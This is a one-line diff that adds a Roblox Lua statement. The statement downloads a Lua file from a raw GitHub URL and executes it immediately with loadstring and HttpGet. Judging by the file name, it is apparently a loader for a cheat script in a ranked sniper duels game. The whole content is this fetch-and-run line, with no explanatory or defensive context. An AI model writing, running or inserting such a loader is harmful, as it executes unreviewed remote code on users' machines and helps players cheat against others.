@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/ranked-sniper-duels-spam0-1grm4df4mdld9p.lua"))()
